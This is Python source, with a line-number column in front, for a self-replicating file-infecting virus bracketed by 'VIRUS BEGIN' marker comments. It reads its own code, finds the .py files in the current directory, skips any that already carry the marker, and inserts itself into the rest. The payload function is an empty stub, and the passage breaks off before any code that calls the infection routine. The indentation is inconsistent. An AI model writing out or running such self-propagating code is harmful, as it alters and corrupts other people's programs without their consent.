
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
#!/usr/bin/env python
 
##### VIRUS BEGIN #####
import os, glob, sys, re
 
def getVirusFromSelf():
    "getVirusFromSelf - Returns the lines of the virus in a list"
    code = []
   fileHandle = open(sys.argv[0], "r")
   inVirus = False
   while 1:
       line = fileHandle.readline()
       if not line: break
       if re.search("^##### VIRUS BEGIN #####", line): inVirus = True
       if inVirus: code.append(line)
       if re.search("^##### VIRUS END #####", line): break
   fileHandle.close()
   return code
 
def getPythonList():
   "getPythonList - Return a list of Python programs"
   progs = glob.glob("*.py")
   return progs
 
def readFile(filename):
   "readFile - Returns a list of lines in a file"
   fileHandle = open(filename, "r")
   code = []
   while 1:
       line = fileHandle.readline()
       if not line: break
       code.append(line)
   fileHandle.close()
   return code
 
def isInfected(code):
   "isInfected - Returns True if infected, False if not"
   for line in code:
       if re.search("^##### VIRUS BEGIN #####", line): return True
   return False
 
def infectCode(progCode, virusCode):
   "infectCode - Inserts the virusCode into the progCode"
   code = []
   if re.search("^#!", progCode[0]): code.append(progCode.pop(0))
   for line in virusCode: code.append(line)
   for line in progCode: code.append(line)
   return code
 
def writeFile(filename, code):
   "writeFile - Write the lines in a list of code to a filename"
   fileHandle = open(filename, "w")
   for line in code:
       fileHandle.write(line)
   fileHandle.close()
 
def virusPayload():
   "virusPayload - Function for what the virus should do"
   pass
